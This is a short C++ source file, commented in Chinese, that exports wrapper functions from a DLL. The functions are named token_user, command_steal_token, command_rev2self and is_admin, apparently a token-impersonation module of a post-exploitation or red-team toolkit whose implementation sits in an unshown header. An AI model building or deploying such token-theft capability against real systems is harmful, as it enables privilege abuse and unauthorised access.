// tokens_dll.cpp - 主DLL文件
#include <windows.h>
#include "tokens.h"

// DLL入口点
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// 导出函数
extern "C" __declspec(dllexport) BOOL token_user_export(HANDLE token, char* buffer, int length) {
    return token_user(token, buffer, length);
}

extern "C" __declspec(dllexport) void command_steal_token_export(char* buffer, int length, void(*callback)(char*, int, int)) {
    command_steal_token(buffer, length, callback);
}

extern "C" __declspec(dllexport) void command_rev2self_export() {
    command_rev2self();
}

extern "C" __declspec(dllexport) BOOL is_admin_export() {
    return is_admin();
}